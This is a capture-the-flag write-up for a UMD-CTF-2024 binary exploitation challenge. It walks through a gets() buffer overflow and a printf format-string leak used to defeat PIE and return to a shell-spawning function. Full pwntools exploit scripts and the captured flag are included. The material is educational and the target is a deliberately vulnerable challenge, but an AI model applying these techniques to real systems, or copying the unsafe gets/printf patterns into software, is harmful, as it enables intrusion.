---
layout: writeup
category: UMD-CTF-2024
chall_description:
points: 432
solves: 71
tags: pwn pwn/buffer-overflow pwn/gets pwn/format-string pwn/ret2win pwn/PIE
date: 2024-4-28
comments: false
---

Thufir Hawat is ready to answer any and all questions you have. Unless it's not about division...  

`nc challs.umdctf.io 32300`  

[mentat-question.c](https://github.com/Nightxade/ctf-writeups/blob/master/assets/CTFs/UMD-CTF-2024/mentat-question.c)  
[mentat-question](https://github.com/Nightxade/ctf-writeups/blob/master/assets/CTFs/UMD-CTF-2024/mentat-question)  
[Dockerfile](https://github.com/Nightxade/ctf-writeups/blob/master/assets/CTFs/UMD-CTF-2024/Dockerfile)  

---

We're provided a C source file and an ELF binary. Here's the source:  

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>

void secret() {
    system("/bin/sh");
}

uint32_t calculate(uint32_t num1, uint32_t num2) {
    printf("%i\n", num1);
    printf("%i\n", num2);

    char buf[16];

    if (num2 < 1) {
        puts("Oh, I was not aware we were using negative numbers!");
        puts("Would you like to try again?");
        gets(buf);
        if (strncmp(buf, "Yes", 3) == 0) {
            fputs("Was that a ", stdout);
            printf(buf);
            fputs(" I heard?\n", stdout);
            return 0;
        } else {
            puts("I understand. Apologies, young master.");
            exit(0);
        }
    }

    return num1 / num2;
}

int main() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    uint32_t num1;
    uint32_t num2;
    uint32_t res = 0;

    char buf[11];
    puts("Hello young master. What would you like today?");
    fgets(buf, sizeof(buf), stdin);

    if (strncmp(buf, "Division", 8) == 0) {
        puts("Of course");
        while (res == 0) {
            puts("Which numbers would you like divided?");
            fgets(buf, sizeof(buf), stdin);
            num1 = atoi(buf);

            fgets(buf, sizeof(buf), stdin);
            getc(stdin);
            if (strncmp(buf, "0", 1) == 0) {
                puts("I'm afraid I cannot divide by zero, young master.");
                return 1;
            } else {
                num2 = atoi(buf);
            }

            res = calculate(num1, num2);
        }
    }

    return 0;
}

```

The ELF binary is x86_64, and running checksec on it tells us it has the NX and PIE protections enabled. For those who are unaware, NX disallows execution of bytes on the stack (or in certain memory areas). PIE, meanwhile, randomizes the base address of the ELF. Essentially, instead of the base address being a constant 0x40000000 or whatever, which would allow us to always know the address of every function, it randomizes this base address, preventing the user from gaining knowledge of what the address of every function is. This makes it harder for the user to return to a specific memory address in an attack.  

Let's check out the C code now and see what vulnerabilities we can find.  

There don't appear to be any major vulnerabilities in the main function, so let's see what we can find in calculate(). First things first, we need to set num2 to be less than 1. For some reason, inputting num2 as 0 or -1 wasn't actually working for me locally, but through stress testing, I realized that simply sending 3 new lines actually allowed access into the if statement code block.  

Here, there are now two obvious vulnerabilities. Firstly, `gets(buf)` is called. gets() is a function that is well-known to allow unbounded input, so basically free buffer overflow. Secondly, `printf(buf)` is called. With printf(), whenever a program prints out a user-controlled variable, a format specifier must be used. Otherwise, it allows a malicious user to write their own format specifiers into the output variable, which can allow information to be gained about memory on the stack.  

However, there is one slight problem with entering any sort of input into buf. The line `strncmp(buf, "Yes", 3) == 0` attempts to ensure that the user input is set to "Yes". If this check fails, the program exits. Fortunately, however, the way this check is implemented makes it so that it only checks if the first 3 bytes of buf are equal to "Yes". Therefore, we can simply enter whatever payload we want after "Yes" and pass the check!  

Now we can develop a process to return to the win function, secret().  

Firstly, we need to determine the PIE offset. We need the PIE offset to calculate the address of the secret() function. We can do this by leaking the address of main() or some other function, since the offset between main() and secret() is known and constant, regardless of PIE.  

Once we determine the PIE offset, we can calculate the address of the secret() function, and then override RIP (the return address) on the stack to return to secret().  

Let's first deal with finding the offset. Well, we know calculate() is called from main(), so main's address has to be on the stack, wherever RIP is located, since the program will need to return to it later.  

So, we can first find the offset of the RIP with pwntools's cyclic() and cyclic_find() functions. Here's the script for that:  

```py
from pwn import *
import pwnlib.util.packing as pack

elf = ELF("./mentat-question")
context.binary = elf
context.log_level = "DEBUG"
context(terminal=["tmux","split-window", "-h"])

p = process('./mentat-question')
gdb.attach(p)

# NOTE: logic starts here

p.recvuntil(b'?\n')
p.sendline(b'Division')

def send_payload(b):
    p.recvuntil(b'?\n')
    p.send(b'\n\n\n')
    p.sendlineafter(b'?\n', b)
    return p.recvline()

send_payload(b'Yes' + cyclic(1024))
# after checking out in GDB, I found that RSP, when the program ran into SIGSEV, was set to "aaagaaah"  
ret = cyclic_find('aaagaaah')

p.interactive()
```

Note that you should be using the pwndbg extension for GDB. It helps a lot!  

Now that we have the offset of RIP, we can now use the format string vulnerability to essentially read the stack. I initially tried just sending a string of many "%p", but it actually ended up overriding RIP on the stack, which triggered a SIGSEV. So that didn't work.  

Instead, we can perform an arbitrary read, which will allow us to read the memory of a certain offset on the stack. Through a bit of testing, I was able to figure out that the offset we needed was equal to `ret - 2`:  

```py
res = send_payload(b'Yes%' + str(ret-2).encode() + b'$p').decode('ascii')
res = res.split('0x')[-1].split(' ')[0]
main = int(res, 16)
```

The way I confirmed was simply by running `print 'main'` in GDB every time after the Python script finished execution, which told me the address of main() for that current run. I kept on changing the +/- offset on ret until I got the address of main().  

Now that we have the address of main(), we can simply calculate the PIE offset and thus the address of secret() as follows:  

```py
PIE = main - elf.symbols['main']
winaddr = PIE + elf.symbols['secret']
```

Finally, we can override RIP and return to secret to pop a shell!  

```py
send_payload(b'Yes' + b'A'*(ret) + pack.p64(winaddr + 1))
```

Now we can change the target to the remote service, run the script, do "cat flag.txt", and get the flag!  

Here's the full script:  

```py
from pwn import *
import pwnlib.util.packing as pack

elf = ELF("./mentat-question")
context.binary = elf
context.log_level = "DEBUG"
context(terminal=["tmux","split-window", "-h"])

# p = process('./mentat-question')
# gdb.attach(p)

p = remote('challs.umdctf.io', 32300)

p.recvuntil(b'?\n')
p.sendline(b'Division')

def send_payload(b):
    p.recvuntil(b'?\n')
    p.send(b'\n\n\n')
    p.sendlineafter(b'?\n', b)
    return p.recvline()

# NOTE: find return address
# send_payload(b'Yes' + cyclic(1024))

ret = cyclic_find('aaagaaah')

# NOTE: get main address
res = send_payload(b'Yes%' + str(ret-2).encode() + b'$p').decode('ascii')
res = res.split('0x')[-1].split(' ')[0]
main = int(res, 16)

# NOTE: calculate secret() address
PIE = main - elf.symbols['main']
winaddr = PIE + elf.symbols['secret']

# NOTE: ret2win
send_payload(b'Yes' + b'A'*(ret) + pack.p64(winaddr + 1))

p.interactive()
```

And here's the flag!  

    UMDCTF{3_6u1ld_n4v16470r5_4_7074l_0f_1.46_m1ll10n_62_50l4r15_r0und_7r1p}